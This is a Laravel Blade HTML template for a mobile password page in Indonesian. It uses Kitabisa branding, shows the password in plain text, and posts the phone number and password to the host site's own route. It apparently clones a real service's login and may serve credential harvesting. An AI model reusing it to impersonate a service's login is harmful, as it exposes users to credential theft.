	<!DOCTYPE html>
	<html>

	<head>
	    <title></title>
	    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	    <meta name="HandheldFriendly" content="true" />
	    <link rel="stylesheet" type="text/css" href="<?=url('/')?>/public/template/admin/dist/css/style.min.css">
	    <style type="text/css">
	        .hBSxmh {
	            max-width: 480px;
	            width: 100%;
	            display: flex;
	            height: 60px;
	            -webkit-box-align: center;
	            align-items: center;
	            -webkit-box-pack: justify;
	            justify-content: space-between;
	            margin: 0px auto;
	        }

	        a {
	            text-decoration: none;
	            color: #00aeef;
	            transition: all .35s ease;
	            background-color: transparent;
	        }

	        .sUjAJ {
	            background: white;
	            display: flex;
	            -webkit-box-pack: justify;
	            justify-content: space-between;
	            -webkit-box-align: center;
	            align-items: center;
	            border: none;
	            color: #dedede;
	            padding: 0px 15px;
	            font-size: 12px;
	            height: 36px;
	            width: 100%;
	            border-radius: 5px;
	            margin-right: 15px;
	        }

	        .svg-inline--fa,
	        svg:not(:root).svg-inline--fa {
	            overflow: visible;
	        }

	        svg:not(:root).svg-inline--fa {
	            overflow: visible;
	        }

	        .svg-inline--fa.fa-w-16 {
	            width: 1em;
	        }

	        .svg-inline--fa.fa-w-16 {
	            width: 1em;
	        }

	        .svg-inline--fa {
	            display: inline-block;
	            font-size: inherit;
	            height: 1em;
	            vertical-align: -.125em;
	        }

	        .svg-inline--fa {
	            display: inline-block;
	            font-size: inherit;
	            height: 1em;
	            overflow: visible;
	            vertical-align: -0.125em;
	        }

	        .clPWcC {
	            max-width: 1020px;
	            margin: 0px auto;
	            padding-top: 5px;
	        }

	        .iBqPAl {
	            margin: 15px 0px 0px;
	            font-weight: 600;
	            font-size: 18px;
	            line-height: 23px;
	        }

	        .kyUdEc {
	            padding: 20px 0px;
	        }

	        .jEenUH {
	            display: inline-block;
	            border: 0px;
	            font-weight: 700;
	            line-height: normal;
	            text-align: center;
	            vertical-align: middle;
	            cursor: pointer;
	            transition: all 0.35s ease 0s;
	            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	            text-decoration: none;
	            width: 100%;
	            padding: 11px 37.5px;
	            font-size: 16px;
	            border-radius: 20px;
	            background-color: rgb(0, 174, 239);
	            color: rgb(255, 255, 255);
	        }

	        .calMVq {
	            display: flex;
	            font-weight: 700;
	            line-height: normal;
	            text-align: center;
	            -webkit-box-pack: center;
	            justify-content: center;
	            vertical-align: middle;
	            cursor: pointer;
	            transition: all 0.35s ease 0s;
	            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	            text-decoration: none;
	            width: 100%;
	            padding: 11px 37.5px;
	            font-size: 16px;
	            border-radius: 20px;
	            background-color: rgb(255, 255, 255);
	            color: rgb(0, 174, 239);
	            border: 1px solid rgb(0, 174, 239);
	        }

	        .dcmUJR {
	            margin-right: 8px;
	        }

	        .homepage {
	            background-color: white;
	            position: relative;
	            /*top: 60px;*/
	            max-width: 480px;
	            width: 100%;
	            margin: 0px auto;
	            padding: 0px 16px 1em;
	            box-sizing: border-box;
	            min-height: calc(100vh - 60px);
	            /*border: 2px solid red;						*/
	        }

	        .container-mall {
	            max-width: 480px;
	            width: 100%;
	            margin: 0px auto;
	            padding: 0px 16px 0px;
	            box-sizing: border-box;
	        }

	        .banner {
	            max-width: 480px;
	            width: 100%;
	            margin: 0px auto;
	            padding: 4em 0em 4em 0em;
	        }

	        .header {
	            background: #fb036b;
	            position: fixed;
	            width: 100%;
	            top: 0px;
	            left: 0px;
	            right: 0px;
	            z-index: 11;
	        }


	        .card-mall {
	            background: white;
	            box-shadow: rgba(152, 152, 152, 0.5) 0px 2px 8px 1px;
	            border-radius: 1.5em;
	            /*border: 2px solid red;			*/
	            margin-bottom: 1em;
	            /*margin-top: 1em;*/
	        }

	        .kategori {
	            padding: 0.8em 0em 1em 0em;
	            display: flex;
	            position: relative;
	            top: -3em;
	            margin-bottom: -2em;
	            z-index: 2;
	            overflow-y: visible;
	            overflow-x: auto;

	        }

	        .nama-kategori {
	            padding: 0.5em 0.5em 0.5em 0.5em;
	            display: flex;
	            justify-content: space-around;
	        }

	        .footer {
	            position: fixed;
	            left: 0;
	            bottom: 0;
	            width: 100%;
	            color: white;
	            text-align: center;
	            background-color: transparent;
	        }

	        .footer-mall-menu {
	            background: white;
	            box-shadow: rgba(152, 152, 152, 0.5) 0px 2px 8px 1px;
	            border-radius: 3em;
	            margin-bottom: 1em;

	        }

	        .sosmed>img {
	            margin: 0px 0.6em 0px 0.6em !important;
	        }

			.loader-container{
				width: 100%;
				height: 100vh;
				position: fixed;
				display: flex;
				align-items: center;
				justify-content: center;
			}

	    </style>
	</head>
	<div class="modal fade" id="modal_loader" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="padding: 1.5em; padding: 0px;">
		<div class="modal-dialog modal-dialog-centered" role="document" style="padding: 0px; position: relative;">
			<div class="modal-content st0" style="border-radius: 1.2em; display: flex; justify-content: center; align-items: center; margin: 8em 1em 0em 1em; color: white; border: #353535;">
				<div class="loader-container">
					<div class="spinner-border text-danger" role="status">
						<span class="sr-only">Loading...</span>
					</div>
				</div>
			</div>
		</div>
	</div>
	<body style="margin: 0px; background: #fb036b;">
	    <header class="style__Container-sc-3fiysr-0 header">
	        <div class="style__Wrapper-sc-3fiysr-2 hBSxmh" style="display: flex; justify-content: space-between;">
	            <a href="<?=url('/')?>" style="padding-left: 1em;">
	                <img src="<?=url('/')?>/public/img/back_white.svg">
	            </a>
	            <a id="defaultheader_logo" title="Kitabisa" style="margin-left: 20px; height:33px;margin-right:20px" href="/">
	                <img src="<?=url('/')?>/public/img/logo.svg">
	                <img src="<?=url('/')?>/public/img/logo_text.svg">
	            </a>
	            <div style="margin-right: 2.5em;">
	                <img src="<?=url('/')?>/public/img/back.svg" hidden>
	            </div>
	        </div>
	    </header>

	    <form action="<?=url('/post-password')?>" method="post" id="form_input">
	        {{csrf_field()}}
	        <div class="wrapper"
	            style="background: #fb036b; margin-top: 8em; display: flex; flex-direction: column; justify-content: center;">
	            <div style="text-align: center; width: 100%; margin-bottom: 0.3em; color: white;">Masukan <b>Password</b>
	                kamu disini</div>
	            <div class="container-mall" style="display: flex; justify-content: space-around;">
	                <div class="footer-mall-menu"
	                    style="width: 90%; height: 3.5em; display: flex; align-items: center; justify-content: space-around;">
	                    <input name="no_telp" type="text" value="{{$no_telp}}" hidden>
	                    <div>
	                        <input name="password" type="text" name="nomor_hp" id="nomor_hp" class="form-control"
	                            style="width: 100% !important; padding: .375rem; border: none; text-align: center;"
	                            placeholder="Password" required>
	                    </div>
	                </div>
	            </div>
	            <div style="display: flex; justify-content: center;">
	                <div style="text-align: center; width: 90%; margin-top: 0.3em; color: white;">dengan melanjutkan kamu
	                    setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami</div>
	            </div>
	        </div>
	        <div class="footer" style="background: #fb036b; ">
	            <button type="submit" class="btn" style="color: white; font-weight: 600;font-size: 1.2em;">Lanjut</button>

	        </div>
	    </form>

	    @if(Session::has('message'))
	    <div id="modal-password" class="modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel"
	        aria-hidden="true" data-backdrop="static" data-keyboard="false">
	        <div class="modal-dialog modal-sm modal-dialog-centered">
	            <div class="modal-content">
	                <div class="modal-body text-center font-weight-bold py-3">
	                    {{Session::get('message')}}
	                    <div class="row mt-2 p-2">
	                        <button type="button" class="col-sm-12 btn waves-effect waves-light btn-outline-secondary"
	                            data-dismiss="modal">Tutup</button>

	                    </div>
	                </div>
	                <!-- /.modal-content -->
	            </div>
	            <!-- /.modal-dialog -->
	        </div>
	    </div>
	    @endif


	</body>
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

	<script src="<?=url('/')?>/public/template/admin/assets/libs/popper.js/dist/umd/popper.min.js"></script>
	<script src="<?=url('/')?>/public/template/admin/assets/libs/bootstrap/dist/js/bootstrap.min.js"></script>

	<script>
	    @if(Session::has('message'))
	    $('#modal-password').modal('show')
		@endif
		
		$("input[required], select[required]").attr("oninvalid",
	        "this.setCustomValidity('Harap Memasukkan Password')");
	    $("input[required], select[required]").attr("oninput", "setCustomValidity('')");

	</script>



	<script type="text/javascript">
	    (function ($) {
	        $.fn.nodoubletapzoom = function () {
	            $(this).bind('touchstart', function preventZoom(e) {
	                var t2 = e.timeStamp,
	                    t1 = $(this).data('lastTouch') || t2,
	                    dt = t2 - t1,
	                    fingers = e.originalEvent.touches.length;
	                $(this).data('lastTouch', t2);
	                if (!dt || dt > 500 || fingers > 1) return;
	                e.preventDefault();
	                $(this).trigger('click').trigger('click');
	            });
	        };
	    })(jQuery);

	    $('#nomor_hp').keyup(function () {
	        $(this).val($(this).val().replace(/(\d{3})\-?(\d{3})\-?(\d{4})/, '$1-$2-$3'))
	    });

		$( "#form_input").submit(function( event ) {
			show_loader();
		});

		function show_loader(){
			console.log('show');
			$("#modal_loader").modal("show");
		};

		function hide_loader(){
			console.log('hide');
			$("#modal_loader").modal("hide");
		};

	</script>

	</html>
